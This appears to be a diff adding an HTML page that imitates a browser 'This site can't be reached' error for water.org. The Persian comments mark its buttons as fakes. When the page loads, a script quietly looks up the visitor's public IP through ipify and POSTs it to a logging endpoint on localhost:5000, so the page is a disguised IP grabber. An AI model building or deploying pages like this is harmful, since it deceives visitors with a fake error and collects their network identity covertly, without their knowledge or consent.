@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>water.org</title>
+    <style>
+        body {
+            background-color: rgba(32, 33, 36, 1);
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+        }
+        h1, p {
+            color: rgb(154, 160, 166);
+        }
+        .nav-wrapper {
+            margin-top: 20px;
+        }
+        .blue-button {
+            background-color: #1a73e8;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+        }
+        .blue-button:hover {
+            background-color: #1557b0;
+        }
+        .secondary-button {
+            background-color: #666;
+            color: white;
+            padding: 8px 16px;
+            border: none;
+            cursor: pointer;
+            margin-left: 10px;
+        }
+        .secondary-button:hover {
+            background-color: #555;
+        }
+    </style>
+</head>
+<body>
+    <h1>This site can’t be reached</h1>
+    <p>water.org’s server IP address could not be found.</p>
+    <p>Try:<br><br>. Checking the connection</p>
+    <p>ERR_NAME_NOT_RESOLVED</p>
+
+    <div id="buttons" class="nav-wrapper suggested-left">
+        <div id="control-buttons">
+            <button id="reload-button" class="blue-button text-button" onclick="reloadPage()">
+                Reload
+            </button>
+            <button id="details-button" class="secondary-button text-button small-link" onclick="showDetails()">
+                Details
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // گرفتن IP موقع ورود
+        window.onload = function() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    let userIP = data.ip;
+                    console.log("IP کاربر: " + userIP);
+                    sendIPToServer(userIP); // فرستادن به سرور
+                })
+                .catch(error => console.log("خطا: " + error));
+        };
+
+        // تقلید ریلود
+        function reloadPage() {
+            alert("Connection failed! Please try again.");
+        }
+
+        // نمایش جزئیات تقلبی
+        function showDetails() {
+            alert("No additional details available. Check your network.");
+        }
+
+        // فرستادن IP به سرور
+        function sendIPToServer(ip) {
+            fetch('http://localhost:5000/log-ip', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ip: ip })
+            })
+            .then(response => console.log("IP فرستاده شد!"))
+            .catch(error => console.log("خطا در ارسال: " + error));
+        }
+    </script>
+</body>
+</html>
